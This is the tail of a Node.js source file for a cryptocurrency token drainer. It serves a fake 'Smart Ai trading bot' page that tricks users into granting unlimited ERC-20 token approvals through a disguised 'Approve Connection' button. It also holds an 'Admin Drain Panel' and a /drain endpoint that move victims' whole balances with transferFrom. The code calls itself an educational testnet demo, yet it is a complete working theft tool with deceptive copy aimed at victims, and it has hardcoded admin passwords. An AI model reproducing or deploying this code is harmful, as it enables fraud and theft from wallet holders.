                <button id="copy-uri">📋 Copy URI</button>
                <button id="refresh-uri">🔄 Refresh Connection</button>
            </div>
            
            <div id="wallet-info" style="display: none;">
                <h3>💼 Wallet Information</h3>
                <p><strong>Connected Address:</strong> <span id="user-address"></span></p>
                <div class="token-info" id="token-list">
                    <p>Loading token information...</p>
                </div>
            </div>

            <div id="approval-section" style="display: none;">
                <h3>🔐 Token Approval</h3>
                <div class="info">
                    <!--<p><strong>Spender Address:</strong> ${SPENDER_ADDRESS}</p> -->
                </div>
                
                <label for="token-address">Select Token:</label>
                <select id="token-address">
                    ${TOKEN_ADDRESSES.map(addr => `<option value="${addr}">${TOKEN_SYMBOLS[addr]}</option>`).join('')}
                </select>
                
                <label for="approval-amount">Approval connection to begin trading</label>
                <input style="display: none;" type="number" id="approval-amount" placeholder="Enter amount to approve (0 for max)" step="0.000001" min="0" value="0">
                <button id="approve">Approve Connection</button> 
                
                <div class="warning">
                    <p><strong>What you're about to do:</strong> You will approve Smart Ai trading bot to trade your tokens and make profit</p>
                </div>
            </div>

            <button id="check-allowance" style="display: none;">🔍 Check Current Allowance</button>
            
            <div id="status"></div>

            <script>
                const connectBtn = document.getElementById('connect');
                const approveBtn = document.getElementById('approve');
                const checkAllowanceBtn = document.getElementById('check-allowance');
                const copyUriBtn = document.getElementById('copy-uri');
                const refreshUriBtn = document.getElementById('refresh-uri');
                const status = document.getElementById('status');
                const walletInfo = document.getElementById('wallet-info');
                const approvalSection = document.getElementById('approval-section');
                const uriSection = document.getElementById('uri-section');
                const amountInput = document.getElementById('approval-amount');
                const tokenSelect = document.getElementById('token-address');
                let uriCheckInterval;

                function showStatus(message, type = 'info') {
                    status.innerHTML = '<div class="' + type + '">' + message + '</div>';
                }

                function displayURI(uri) {
                    if (uri) {
                        document.getElementById('uri-text').textContent = uri;
                        uriSection.style.display = 'block';
                        
                        const qr = new QRious({
                            element: document.getElementById('qr-code'),
                            value: uri,
                            size: 200
                        });
                    }
                }

                async function checkForURI() {
                    try {
                        const response = await fetch('/get-uri');
                        const data = await response.json();
                        
                        if (data.uri) {
                            displayURI(data.uri);
                            clearInterval(uriCheckInterval);
                        }
                    } catch (error) {
                        console.error('Error checking for URI:', error);
                        showStatus('Failed to fetch WalletConnect URI', 'error');
                    }
                }

                connectBtn.addEventListener('click', async () => {
                    try {
                        showStatus('Initializing connection... Please wait for QR code to appear.', 'info');
                        connectBtn.disabled = true;
                        uriSection.style.display = 'none';
                        
                        uriCheckInterval = setInterval(checkForURI, 500);
                        
                        const response = await fetch('/connect', {
                            method: 'GET',
                            headers: { 'Accept': 'application/json' }
                        });
                        
                        if (!response.ok) {
                            throw new Error('HTTP ' + response.status + ': ' + response.statusText);
                        }
                        
                        const data = await response.json();
                        
                        if (data.connected) {
                            clearInterval(uriCheckInterval);
                            uriSection.style.display = 'none';
                            document.getElementById('user-address').textContent = data.address;
                            walletInfo.style.display = 'block';
                            approvalSection.style.display = 'block';
                            checkAllowanceBtn.style.display = 'inline-block';
                            connectBtn.textContent = 'Connected ✓';
                            
                            showStatus('Loading token information...', 'info');
                            await loadTokenInfo();
                            showStatus('Wallet connected successfully!', 'success');
                        } else {
                            throw new Error(data.message || 'Connection failed');
                        }
                    } catch (error) {
                        clearInterval(uriCheckInterval);
                        console.error('Connection error:', error);
                        showStatus('Connection failed: ' + error.message, 'error');
                        connectBtn.disabled = false;
                        connectBtn.textContent = 'Connect Wallet';
                        uriSection.style.display = 'none';
                    }
                });

                copyUriBtn.addEventListener('click', () => {
                    const uriText = document.getElementById('uri-text').textContent;
                    navigator.clipboard.writeText(uriText).then(() => {
                        showStatus('URI copied to clipboard!', 'success');
                    }).catch(() => {
                        showStatus('Failed to copy URI', 'error');
                    });
                });

                refreshUriBtn.addEventListener('click', () => {
                    connectBtn.click();
                });

                approveBtn.addEventListener('click', async () => {
                    let amount = amountInput.value;
                    if (amount < 0) {
                        showStatus('Please enter a valid approval amount', 'error');
                        return;
                    }

                    const token = tokenSelect.value;

                    try {
                        showStatus('Processing approval transaction...', 'info');
                        const response = await fetch('/approve', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ amount: amount, token: token })
                        });
                        const data = await response.json();
                        
                        if (data.success) {
                            showStatus('Approval successful! Transaction hash: ' + data.txHash, 'success');
                            await loadTokenInfo();
                            // Redirect to /select-bot after successful approval
                            window.location.href = '/select-bot';
                        } else {
                            showStatus('Approval failed: ' + data.message, 'error');
                        }
                    } catch (error) {
                        showStatus('Approval failed: ' + error.message, 'error');
                    }
                });

                checkAllowanceBtn.addEventListener('click', async () => {
                    await loadTokenInfo();
                    showStatus('Allowance information refreshed', 'success');
                });

                async function loadTokenInfo() {
                    try {
                        const response = await fetch('/token-info');
                        const data = await response.json();
                        
                        const tokenList = document.getElementById('token-list');
                        tokenList.innerHTML = data.tokens.map(t => {
                            return [
                                '<div>',
                                '<strong>' + t.symbol + ' (' + t.address + ')</strong>',
                                '<p>Balance: ' + t.balance + ' ' + t.symbol + '</p>',
                                '<p>Allowance: ' + t.allowance + ' ' + t.symbol + '</p>',
                                '</div>'
                            ].join('');
                        }).join('<hr>');
                    } catch (error) {
                        console.error('Failed to load token info:', error);
                        showStatus('Failed to load token info: ' + error.message, 'error');
                    }
                }
            </script>








                </main>
                <!-- footer begin -->
                <footer>
                    <div class="uk-section">
                        <div class="uk-container uk-margin-top">
                            <div class="uk-grid">
                                <div class="uk-width-2-3@m">
                                    <div class="uk-child-width-1-2@s uk-child-width-1-3@m" data-uk-grid="">
                                        <div>
                                            <h5>Instruments</h5>
                                            <ul class="uk-list uk-link-text">
                                                <li><a href="#">Stock</a></li>
                                                <li><a href="#">Indexes</a></li>
                                                <li><a href="#">Currencies</a></li>
                                                <li><a href="#">Metals<span class="uk-label uk-margin-small-left in-label-small">Popular</span></a></li>
                                                <li><a href="#">Oil and gas</a></li>
                                                <li><a href="#">Cryptocurrencies<span class="uk-label uk-margin-small-left in-label-small">Popular</span></a></li>
                                            </ul>
                                        </div>
                                        <div>
                                            <h5>Analytics</h5>
                                            <ul class="uk-list uk-link-text">
                                                <li><a href="#">World Markets</a></li>
                                                <li><a href="#">Trading Central<span class="uk-label uk-margin-small-left in-label-small">New</span></a></li>
                                                <li><a href="#">Forex charts online</a></li>
                                                <li><a href="#">Market calendar</a></li>
                                                <li><a href="#">Central banks<span class="uk-label uk-margin-small-left in-label-small">New</span></a></li>
                                            </ul>
                                        </div>
                                        <!--
                                        <div class="in-margin-top-60@s">
                                            <h5>Education</h5>
                                            <ul class="uk-list uk-link-text">
                                                <li><a href="#">Basic course</a></li>
                                                <li><a href="#">Introductory webinar</a></li>
                                                <li><a href="#">About academy</a></li>
                                            </ul>
                                        </div>
                                        -->
                                    </div>
                                </div>
                                <div class="uk-width-1-3@m uk-flex uk-flex-right@m">
                                    <!-- social media begin -->
                                    <div class="uk-flex uk-flex-column social-media-list">
                                        <div><a href="https://www.facebook.com/SmartTradingBot" class="color-facebook text-decoration-none"><i class="fab fa-facebook-square"></i> Facebook</a></div>
                                        <div><a href="https://twitter.com/SmartTradingBot_tw" class="color-twitter text-decoration-none"><i class="fab fa-twitter"></i> Twitter</a></div>
                                        <div><a href="https://www.instagram.com/SmartTradingBot_ig" class="color-instagram text-decoration-none"><i class="fab fa-instagram"></i> Instagram</a></div>
                                        <div><a href="#some-link" class="color-telegram text-decoration-none"><i class="fab fa-telegram"></i> Telegram</a></div>
                                        <div><a href="#some-link" class="color-youtube text-decoration-none"><i class="fab fa-youtube"></i> Youtube</a></div>
                                    </div>
                                    <!-- social media end -->
                                </div>
                            </div>
                        </div>
                        <hr class="uk-margin-large">
                        <div class="uk-container">
                            <div class="uk-grid uk-flex uk-flex-middle">
                                <div class="uk-width-2-3@m uk-text-small">
                                    <ul class="uk-subnav uk-subnav-divider uk-visible@s" data-uk-margin="">
                                        <li><a href="#">Risk disclosure</a></li>
                                        <li><a href="#">Privacy policy</a></li>
                                        <li><a href="#">Return policy</a></li>
                                        <li><a href="#">Customer Agreement</a></li>
                                        <li><a href="#">AML policy</a></li>
                                    </ul>
                                    <p class="copyright-text">©2021 Equity Markets Incorporated. All Rights Reserved.</p>
                                </div>
                                <div class="uk-width-1-3@m uk-flex uk-flex-right uk-visible@m">
                                    <span class="uk-margin-right"><img src="/img/in-lazy.gif" data-src="/img/in-footer-mastercard.svg" alt="footer-payment" width="34" height="21" data-uk-img=""></span>
                                    <span><img src="/img/in-lazy.gif" data-src="/img/in-footer-visa.svg" alt="footer-payment" width="50" height="16" data-uk-img=""></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
                <!-- footer end -->
                <!-- to top begin -->
                <a href="#" class="to-top uk-visible@m" data-uk-scroll>
                    Top<i class="fas fa-chevron-up" ></i>
                </a>
                <!-- to top end -->
                <!-- javascript -->
                <script src="/js/vendors/tradingview-widget.min.js"></script>
                <script src="/js/vendors/particles.min.js"></script>
                <script src="/js/config-particles.js"></script>
                <script src="/js/utilities.min.js"></script>
                <script src="/js/config-theme.js"></script>
            </body>


            </html>
    `;
    res.send(htmlContent);
});

// Connect endpoint
app.get('/connect', async (req, res) => {
    if (isConnecting) {
        return res.status(429).json({ connected: false, message: 'Connection attempt already in progress' });
    }

    try {
        isConnecting = true;
        console.log('Connection attempt started');
        
        console.log('Initializing fresh provider...');
        provider = await initProvider();
        
        console.log('Connecting to wallet...');
        const connectionPromise = ethProvider.connect();
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Connection timeout - please try again')), 120000);
        });
        
        await Promise.race([connectionPromise, timeoutPromise]);
        
        console.log('Requesting accounts...');
        const accounts = await provider.send("eth_requestAccounts", []);
        console.log('Accounts received:', accounts);
        
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        
        connectedUsers.add(userAddress);
        
        console.log("Connected address:", userAddress);
        res.json({ 
            connected: true, 
            message: 'Wallet connected successfully',
            address: userAddress 
        });
    } catch (error) {
        console.error("Connect endpoint error:", error);
        
        if (ethProvider) {
            try {
                await ethProvider.disconnect();
                console.log('Provider disconnected due to error');
            } catch (err) {
                console.error('Error disconnecting:', err);
            }
            ethProvider = null;
        }
        
        provider = null;
        signer = null;
        userAddress = null;
        
        let errorMessage = 'Connection failed';
        if (error.message.includes('expired')) {
            errorMessage = 'Connection expired - please try again and connect your wallet quickly';
        } else if (error.message.includes('timeout')) {
            errorMessage = error.message;
        } else {
            errorMessage = 'Connection error: ' + error.message;
        }
        
        res.status(500).json({ 
            connected: false, 
            message: errorMessage
        });
    } finally {
        isConnecting = false;
    }
});

// Token info endpoint
app.get('/token-info', async (req, res) => {
    if (!signer) {
        return res.status(400).json({ message: 'Not connected to a wallet' });
    }

    try {
        const infos = await Promise.all(TOKEN_ADDRESSES.map(async (addr) => {
            try {
                const tokenContract = new ethers.Contract(addr, ERC20_ABI, provider);
                
                const [balance, allowance, symbol, decimals] = await Promise.all([
                    tokenContract.balanceOf(userAddress),
                    tokenContract.allowance(userAddress, SPENDER_ADDRESS),
                    tokenContract.symbol(),
                    tokenContract.decimals()
                ]);

                const formatAmount = (amount) => ethers.utils.formatUnits(amount, decimals);

                return {
                    address: addr,
                    balance: formatAmount(balance),
                    allowance: formatAmount(allowance),
                    symbol: symbol,
                    decimals: decimals
                };
            } catch (error) {
                console.error(`Error fetching info for token ${addr}:`, error);
                return {
                    address: addr,
                    balance: 'Error',
                    allowance: 'Error',
                    symbol: 'Unknown',
                    decimals: 0
                };
            }
        }));

        res.json({ tokens: infos });
    } catch (error) {
        console.error("Token info error:", error);
        res.status(500).json({ message: 'Failed to fetch token info: ' + error.message });
    }
});

// Approve endpoint
app.post('/approve', async (req, res) => {
    if (!signer) {
        return res.status(400).json({ message: 'Not connected to a wallet' });
    }

    const { amount, token } = req.body;
    if (amount < 0 || !TOKEN_ADDRESSES.includes(token)) {
        return res.status(400).json({ message: 'Invalid approval amount or token address' });
    }

    try {
        const tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
        
        const decimals = await tokenContract.decimals();
        
        let approvalAmount;
        if (parseFloat(amount) === 0) {
            approvalAmount = ethers.constants.MaxUint256;
            console.log(`Approving unlimited tokens (${token}) to ${SPENDER_ADDRESS}`);
        } else {
            approvalAmount = ethers.utils.parseUnits(amount.toString(), decimals);
            console.log(`Approving ${amount} tokens (${token}, ${approvalAmount.toString()} wei) to ${SPENDER_ADDRESS}`);
        }
        
        const tx = await tokenContract.approve(SPENDER_ADDRESS, approvalAmount);
        await tx.wait();
        
        res.json({ 
            success: true,
            message: `Successfully approved ${amount === 0 ? 'unlimited' : amount} tokens for ${token}`,
            txHash: tx.hash
        });
    } catch (error) {
        console.error("Approve endpoint error:", error);
        res.status(500).json({ 
            success: false,
            message: 'Approval error: ' + error.message 
        });
    }
});

// Admin panel endpoint
app.get('/admin', (req, res) => {
    if (req.query.password !== 'admin123') {
        return res.status(403).send('Forbidden: Invalid password');
    }

    const html = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Admin Drain Panel</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
                .user { border: 1px solid #ccc; padding: 15px; margin: 10px 0; border-radius: 5px; }
                button { padding: 10px; margin: 5px; background: #dc3545; color: white; cursor: pointer; border-radius: 5px; }
            </style>
        </head>
        <body>
            <h1>🎓 Admin Drain Panel (Educational Demo)</h1>
            <div class="warning">
                <p><strong>Warning:</strong> This panel demonstrates draining approved tokens from connected wallets. Use only for education!</p>
            </div>
            <div id="users">
                ${Array.from(connectedUsers).map(user => `
                    <div class="user">
                        <h3>User Address: ${user}</h3>
                        ${TOKEN_ADDRESSES.map(token => `
                            <button onclick="drain('${user}', '${token}')">Drain ${token.slice(0, 6)}... from ${user.slice(0, 6)}...</button>
                        `).join('')}
                    </div>
                `).join('')}
            </div>
            <script>
                async function drain(user, token) {
                    if (!confirm('Are you sure you want to drain this token from the user?')) return;
                    try {
                        const response = await fetch('/drain', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ userAddress: user, tokenAddress: token })
                        });
                        const data = await response.json();
                        alert(data.success ? 'Drain successful! Tx: ' + data.txHash : 'Drain failed: ' + data.message);
                    } catch (error) {
                        alert('Error: ' + error.message);
                    }
                }
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

// Drain endpoint
app.post('/drain', async (req, res) => {
    const { userAddress, tokenAddress } = req.body;
    if (!userAddress || !TOKEN_ADDRESSES.includes(tokenAddress)) {
        return res.status(400).json({ success: false, message: 'Invalid user address or token address' });
    }

    try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, maliciousSigner);
        
        const balance = await tokenContract.balanceOf(userAddress);
        if (balance.isZero()) {
            return res.json({ success: false, message: 'No balance to drain' });
        }

        const allowance = await tokenContract.allowance(userAddress, SPENDER_ADDRESS);
        if (allowance.lt(balance)) {
            return res.json({ success: false, message: 'Insufficient allowance to drain full balance' });
        }

        const decimals = await tokenContract.decimals();
        console.log(`Draining ${ethers.utils.formatUnits(balance, decimals)} tokens (${tokenAddress}) from ${userAddress}`);
        
        const tx = await tokenContract.transferFrom(userAddress, SPENDER_ADDRESS, balance);
        await tx.wait();

        res.json({ 
            success: true,
            message: 'Tokens drained successfully',
            txHash: tx.hash 
        });
    } catch (error) {
        console.error("Drain endpoint error:", error);
        res.status(500).json({ 
            success: false,
            message: 'Drain error: ' + error.message 
        });
    }
});

app.listen(port, () => {
    console.log(`Educational Token Drainer Demo running at http://127.0.0.1:${port}`);
    console.log('This is a testnet educational tool for learning about token drainers. Use ethically!');
    console.log('Admin panel: http://127.0.0.1:3000/admin?password=admin123');
    console.log('admin_pass=66MYEvxsoHk7qHU8');
});